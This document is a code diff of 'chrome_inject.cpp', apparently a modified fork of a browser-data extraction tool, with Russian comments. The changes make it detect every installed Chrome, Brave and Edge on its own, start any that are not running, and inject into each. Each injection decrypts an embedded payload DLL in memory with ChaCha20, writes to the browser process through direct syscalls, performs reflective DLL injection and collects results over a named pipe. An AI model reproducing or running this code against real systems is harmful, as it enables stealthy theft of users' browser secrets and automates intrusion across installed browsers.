@@ -1,5 +1,5 @@
 // chrome_inject.cpp
-// v0.13.0 (c) Alexander 'xaitax' Hagenah
+// v0.14.0 (c) Alexander 'xaitax' Hagenah, modified for automatic browser detection and default browser start
 // Licensed under the MIT License. See LICENSE file in the project root for full license information.
 
 #include <Windows.h>
@@ -86,14 +86,12 @@ struct HandleGuard
 
 namespace Injector
 {
-
+    // MODIFIED: Удалено поле autoStartBrowser, browserType не нужно
     struct Configuration
     {
-        bool autoStartBrowser = false;
         bool verbose = false;
         fs::path outputPath;
         std::string browserDisplayName;
-        std::wstring browserType;
         std::wstring browserProcessName;
         std::wstring browserDefaultExePath;
     };
@@ -144,10 +142,16 @@ namespace Injector
             SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
         }
 
+        // MODIFIED: Обновлен вывод справки, убрано упоминание -s и browser_type
         void PrintUsage()
         {
             HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
             SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
+            std::cout << "Usage: chrome_inject.exe [-v|--verbose] [-o|--output-path <path>] [-h|--help]\n";
+            std::cout << "Options:\n";
+            std::cout << "  -v, --verbose        Enable verbose output\n";
+            std::cout << "  -o, --output-path    Specify output directory\n";
+            std::cout << "  -h, --help           Display this help message\n";
             SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
         }
     }
@@ -664,18 +668,47 @@ namespace Injector
         HandleGuard m_pipeHandle;
     };
 
-    std::optional<Configuration> ParseArguments(int argc, wchar_t *argv[])
+    // NEW: Функция для определения установленных браузеров
+    std::vector<Configuration> DetectInstalledBrowsers()
     {
-        Configuration config;
+        std::vector<Configuration> configs;
+        const std::map<std::wstring, std::pair<std::wstring, std::wstring>> browserMap = {
+            {L"chrome", {L"chrome.exe", L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"}},
+            {L"brave", {L"brave.exe", L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"}},
+            {L"edge", {L"msedge.exe", L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"}}};
+
+        for (const auto& [browserType, browserInfo] : browserMap)
+        {
+            const std::wstring& processName = browserInfo.first;
+            const std::wstring& exePath = browserInfo.second;
+            if (fs::exists(exePath))
+            {
+                Configuration config;
+                config.browserProcessName = processName;
+                config.browserDefaultExePath = exePath;
+                config.browserDisplayName = Utils::Capitalize(Utils::WStringToUtf8(browserType));
+                configs.push_back(config);
+                UI::LogDebug("Detected installed browser: " + config.browserDisplayName);
+            }
+            else
+            {
+                UI::LogDebug("Browser not found at: " + Utils::WStringToUtf8(exePath));
+            }
+        }
+        return configs;
+    }
+
+    // MODIFIED: Обновлена функция ParseArguments
+    std::optional<std::vector<Configuration>> ParseArguments(int argc, wchar_t *argv[])
+    {
+        Configuration baseConfig;
         fs::path customOutputPath;
 
         for (int i = 1; i < argc; ++i)
         {
             std::wstring_view arg = argv[i];
             if (arg == L"--verbose" || arg == L"-v")
-                config.verbose = true;
-            else if (arg == L"--start-browser" || arg == L"-s")
-                config.autoStartBrowser = true;
+                baseConfig.verbose = true;
             else if ((arg == L"--output-path" || arg == L"-o") && i + 1 < argc)
                 customOutputPath = argv[++i];
             else if (arg == L"--help" || arg == L"-h")
@@ -683,201 +716,216 @@ namespace Injector
                 UI::PrintUsage();
                 return std::nullopt;
             }
-            else if (config.browserType.empty() && !arg.empty() && arg[0] != L'-')
-                config.browserType = arg;
             else
             {
-                UI::PrintStatus("[!]", "Unknown or misplaced argument: " + Utils::WStringToUtf8(arg));
+                UI::PrintStatus("[!]", "Unknown argument: " + Utils::WStringToUtf8(arg));
                 return std::nullopt;
             }
         }
 
-        if (config.browserType.empty())
+        // Получаем список установленных браузеров
+        std::vector<Configuration> configs = DetectInstalledBrowsers();
+        if (configs.empty())
         {
-            UI::PrintUsage();
+            UI::PrintStatus("[-]", "No supported browsers found on the system.");
             return std::nullopt;
         }
-        std::transform(config.browserType.begin(), config.browserType.end(), config.browserType.begin(), ::towlower);
 
-        const std::map<std::wstring, std::pair<std::wstring, std::wstring>> browserMap = {
-            {L"chrome", {L"chrome.exe", L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"}},
-            {L"brave", {L"brave.exe", L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"}},
-            {L"edge", {L"msedge.exe", L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"}}};
-
-        auto it = browserMap.find(config.browserType);
-        if (it == browserMap.end())
+        // Применяем параметры verbose и outputPath ко всем конфигурациям
+        for (auto& config : configs)
         {
-            UI::PrintStatus("[-]", "Unsupported browser type: " + Utils::WStringToUtf8(config.browserType));
-            return std::nullopt;
+            config.verbose = baseConfig.verbose;
+            config.outputPath = customOutputPath.empty() ? fs::current_path() / "output" : fs::absolute(customOutputPath);
         }
-        config.browserProcessName = it->second.first;
-        config.browserDefaultExePath = it->second.second;
-        config.browserDisplayName = Utils::Capitalize(Utils::WStringToUtf8(config.browserType));
 
-        config.outputPath = customOutputPath.empty() ? fs::current_path() / "output" : fs::absolute(customOutputPath);
-
-        return config;
+        return configs;
     }
 
+    // MODIFIED: Обновлена функция Run для обработки нескольких браузеров
     int Run(int argc, wchar_t *argv[])
     {
         UI::DisplayBanner();
 
-        auto optConfig = ParseArguments(argc, argv);
-        if (!optConfig)
+        auto optConfigs = ParseArguments(argc, argv);
+        if (!optConfigs)
             return (argc > 1 && (std::wstring_view(argv[1]) == L"--help" || std::wstring_view(argv[1]) == L"-h")) ? 0 : 1;
 
-        Configuration config = *optConfig;
-        UI::EnableVerboseMode(config.verbose);
+        std::vector<Configuration> configs = *optConfigs;
 
-        if (!InitializeSyscalls(config.verbose))
+        bool anySuccess = false;
+        for (const auto& config : configs)
         {
-            return 1;
-        }
+            UI::PrintStatus("[*]", "Processing " + config.browserDisplayName + "...");
+            UI::EnableVerboseMode(config.verbose);
 
-        std::wstring ipcPipeNameW = Utils::GenerateUniquePipeName();
-        PipeCommunicator pipe(ipcPipeNameW);
-        if (!pipe.Create())
-            return 1;
-
-        std::error_code ec;
-        fs::create_directories(config.outputPath, ec);
-        if (ec)
-        {
-            return 1;
-        }
-
-        DWORD targetPid = 0;
-        bool startedByInjector = false;
-        if (auto optPid = Process::GetProcessIdByName(config.browserProcessName))
-        {
-            targetPid = *optPid;
-        }
-        else if (config.autoStartBrowser)
-        {
-            UI::PrintStatus("[*]", config.browserDisplayName + " not running, launching...");
-            if (Process::StartProcess(config.browserDefaultExePath, targetPid))
+            if (!InitializeSyscalls(config.verbose))
             {
-                startedByInjector = true;
-                std::string version = Process::GetProcessVersion(config.browserDefaultExePath);
+                UI::PrintStatus("[-]", "Failed to initialize syscalls for " + config.browserDisplayName);
+                continue;
+            }
+
+            std::wstring ipcPipeNameW = Utils::GenerateUniquePipeName();
+            PipeCommunicator pipe(ipcPipeNameW);
+            if (!pipe.Create())
+            {
+                UI::PrintStatus("[-]", "Failed to create named pipe for " + config.browserDisplayName);
+                continue;
+            }
+
+            std::error_code ec;
+            fs::create_directories(config.outputPath, ec);
+            if (ec)
+            {
+                UI::PrintStatus("[-]", "Failed to create output directory for " + config.browserDisplayName + ": " + ec.message());
+                continue;
+            }
+
+            DWORD targetPid = 0;
+            bool startedByInjector = false;
+            if (auto optPid = Process::GetProcessIdByName(config.browserProcessName))
+            {
+                targetPid = *optPid;
+                UI::PrintStatus("[*]", config.browserDisplayName + " is already running with PID=" + std::to_string(targetPid));
             }
             else
             {
-                return 1;
+                UI::PrintStatus("[*]", config.browserDisplayName + " not running, launching...");
+                if (Process::StartProcess(config.browserDefaultExePath, targetPid))
+                {
+                    startedByInjector = true;
+                    std::string version = Process::GetProcessVersion(config.browserDefaultExePath);
+                    UI::PrintStatus("[+]", config.browserDisplayName + " started with PID=" + std::to_string(targetPid) + ", version: " + version);
+                }
+                else
+                {
+                    UI::PrintStatus("[-]", "Failed to start " + config.browserDisplayName);
+                    continue;
+                }
             }
-        }
 
-        if (targetPid == 0)
-        {
-            return 1;
-        }
-
-        HandleGuard targetProcess(OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, targetPid));
-        if (!targetProcess)
-        {
-            return 1;
-        }
-
-        if (!Process::CheckArchMatch(targetProcess.get()))
-            return 1;
-
-        UI::LogDebug("Loading payload DLL from embedded resource.");
-        auto optResource = Utils::GetEmbeddedResource(L"PAYLOAD_DLL", MAKEINTRESOURCEW(10));
-        if (!optResource)
-        {
-            return 1;
-        }
-
-        std::vector<BYTE> dllBuffer(optResource->dwSize);
-        memcpy(dllBuffer.data(), optResource->pData, optResource->dwSize);
-
-        UI::LogDebug("Decrypting payload in-memory with ChaCha20...");
-        Utils::ChaCha20Decrypt(dllBuffer);
-        UI::LogDebug("Payload decrypted.");
-
-        LPVOID remotePipeNameAddr = nullptr;
-        SIZE_T pipeNameSize = (ipcPipeNameW.length() + 1) * sizeof(wchar_t);
-
-        UI::LogDebug("Calling NtAllocateVirtualMemory_syscall...");
-        NTSTATUS statusAlloc = NtAllocateVirtualMemory_syscall(
-            targetProcess.get(),
-            &remotePipeNameAddr,
-            0,
-            &pipeNameSize,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE);
-        UI::LogDebug("NtAllocateVirtualMemory_syscall returned " + Utils::NtStatusToString(statusAlloc));
-        if (!NT_SUCCESS(statusAlloc))
-        {
-            return 1;
-        }
-
-        auto remoteMemFreer = [&](LPVOID mem)
-        {
-            if (mem)
+            if (targetPid == 0)
             {
-                SIZE_T sizeToFree = 0;
-                NtFreeVirtualMemory_syscall(targetProcess.get(), &mem, &sizeToFree, MEM_RELEASE);
-                UI::LogDebug("Freed remote pipe name memory.");
+                UI::PrintStatus("[-]", "No valid PID for " + config.browserDisplayName);
+                continue;
             }
-        };
-        std::unique_ptr<void, decltype(remoteMemFreer)> remoteMemGuard(remotePipeNameAddr, remoteMemFreer);
 
-        UI::LogDebug("Calling NtWriteVirtualMemory_syscall...");
-        NTSTATUS statusWrite = NtWriteVirtualMemory_syscall(
-            targetProcess.get(),
-            remotePipeNameAddr,
-            (PVOID)ipcPipeNameW.c_str(),
-            pipeNameSize,
-            nullptr);
-        UI::LogDebug("NtWriteVirtualMemory_syscall returned " + Utils::NtStatusToString(statusWrite));
-        if (!NT_SUCCESS(statusWrite))
-        {
-            return 1;
-        }
-
-        USHORT targetArch = 0;
-        Process::GetProcessArchitecture(targetProcess.get(), targetArch);
-        UI::LogDebug("Calling RDI::Inject()...");
-        bool injected = RDI::Inject(
-            targetProcess.get(),
-            dllBuffer,
-            targetArch,
-            remotePipeNameAddr);
-        UI::LogDebug(std::string("RDI::Inject returned ") + (injected ? "true" : "false"));
-        if (!injected)
-        {
-            UI::PrintStatus("[-]", "Reflective DLL Injection failed.");
-            return 1;
-        }
-        UI::LogDebug("Reflective DLL Injection succeeded.");
-
-        if (pipe.WaitForConnection())
-        {
-            if (pipe.SendInitialData(config.verbose, config.outputPath))
+            HandleGuard targetProcess(OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, targetPid));
+            if (!targetProcess)
             {
-                pipe.RelayMessagesUntilComplete();
+                UI::PrintStatus("[-]", "Failed to open process for " + config.browserDisplayName + ". Error: " + std::to_string(GetLastError()));
+                continue;
             }
-        }
 
-        if (startedByInjector)
-        {
-            UI::LogDebug("Terminating browser PID=" + std::to_string(targetPid) + " because injector started it.");
-            HandleGuard processToKill(OpenProcess(PROCESS_TERMINATE, FALSE, targetPid));
-            if (processToKill)
+            if (!Process::CheckArchMatch(targetProcess.get()))
             {
-                TerminateProcess(processToKill.get(), 0);
+                UI::PrintStatus("[-]", "Architecture mismatch for " + config.browserDisplayName);
+                continue;
             }
-        }
-        else
-        {
-            UI::LogDebug("Browser was already running; injector will not terminate it.");
+
+            UI::LogDebug("Loading payload DLL from embedded resource.");
+            auto optResource = Utils::GetEmbeddedResource(L"PAYLOAD_DLL", MAKEINTRESOURCEW(10));
+            if (!optResource)
+            {
+                UI::PrintStatus("[-]", "Failed to load embedded resource for " + config.browserDisplayName);
+                continue;
+            }
+
+            std::vector<BYTE> dllBuffer(optResource->dwSize);
+            memcpy(dllBuffer.data(), optResource->pData, optResource->dwSize);
+
+            UI::LogDebug("Decrypting payload in-memory with ChaCha20...");
+            Utils::ChaCha20Decrypt(dllBuffer);
+            UI::LogDebug("Payload decrypted.");
+
+            LPVOID remotePipeNameAddr = nullptr;
+            SIZE_T pipeNameSize = (ipcPipeNameW.length() + 1) * sizeof(wchar_t);
+
+            UI::LogDebug("Calling NtAllocateVirtualMemory_syscall...");
+            NTSTATUS statusAlloc = NtAllocateVirtualMemory_syscall(
+                targetProcess.get(),
+                &remotePipeNameAddr,
+                0,
+                &pipeNameSize,
+                MEM_COMMIT | MEM_RESERVE,
+                PAGE_READWRITE);
+            UI::LogDebug("NtAllocateVirtualMemory_syscall returned " + Utils::NtStatusToString(statusAlloc));
+            if (!NT_SUCCESS(statusAlloc))
+            {
+                UI::PrintStatus("[-]", "NtAllocateVirtualMemory failed for " + config.browserDisplayName);
+                continue;
+            }
+
+            auto remoteMemFreer = [&](LPVOID mem)
+            {
+                if (mem)
+                {
+                    SIZE_T sizeToFree = 0;
+                    NtFreeVirtualMemory_syscall(targetProcess.get(), &mem, &sizeToFree, MEM_RELEASE);
+                    UI::LogDebug("Freed remote pipe name memory.");
+                }
+            };
+            std::unique_ptr<void, decltype(remoteMemFreer)> remoteMemGuard(remotePipeNameAddr, remoteMemFreer);
+
+            UI::LogDebug("Calling NtWriteVirtualMemory_syscall...");
+            NTSTATUS statusWrite = NtWriteVirtualMemory_syscall(
+                targetProcess.get(),
+                remotePipeNameAddr,
+                (PVOID)ipcPipeNameW.c_str(),
+                pipeNameSize,
+                nullptr);
+            UI::LogDebug("NtWriteVirtualMemory_syscall returned " + Utils::NtStatusToString(statusWrite));
+            if (!NT_SUCCESS(statusWrite))
+            {
+                UI::PrintStatus("[-]", "NtWriteVirtualMemory failed for " + config.browserDisplayName);
+                continue;
+            }
+
+            USHORT targetArch = 0;
+            Process::GetProcessArchitecture(targetProcess.get(), targetArch);
+            UI::LogDebug("Calling RDI::Inject()...");
+            bool injected = RDI::Inject(
+                targetProcess.get(),
+                dllBuffer,
+                targetArch,
+                remotePipeNameAddr);
+            UI::LogDebug(std::string("RDI::Inject returned ") + (injected ? "true" : "false"));
+            if (!injected)
+            {
+                UI::PrintStatus("[-]", "Reflective DLL Injection failed for " + config.browserDisplayName);
+                continue;
+            }
+            UI::PrintStatus("[+]", "Reflective DLL Injection succeeded for " + config.browserDisplayName);
+
+            if (pipe.WaitForConnection())
+            {
+                if (pipe.SendInitialData(config.verbose, config.outputPath))
+                {
+                    pipe.RelayMessagesUntilComplete();
+                }
+            }
+
+            if (startedByInjector)
+            {
+                UI::LogDebug("Terminating browser PID=" + std::to_string(targetPid) + " because injector started it.");
+                HandleGuard processToKill(OpenProcess(PROCESS_TERMINATE, FALSE, targetPid));
+                if (processToKill)
+                {
+                    TerminateProcess(processToKill.get(), 0);
+                    UI::PrintStatus("[*]", config.browserDisplayName + " terminated.");
+                }
+            }
+            else
+            {
+                UI::LogDebug("Browser was already running; injector will not terminate it.");
+            }
+
+            anySuccess = true;
+            UI::PrintStatus("[+]", "Finished processing " + config.browserDisplayName);
         }
 
         UI::LogDebug("Injector finished.");
-        return 0;
+        return anySuccess ? 0 : 1;
     }
-
 }
 
 int wmain(int argc, wchar_t *argv[])
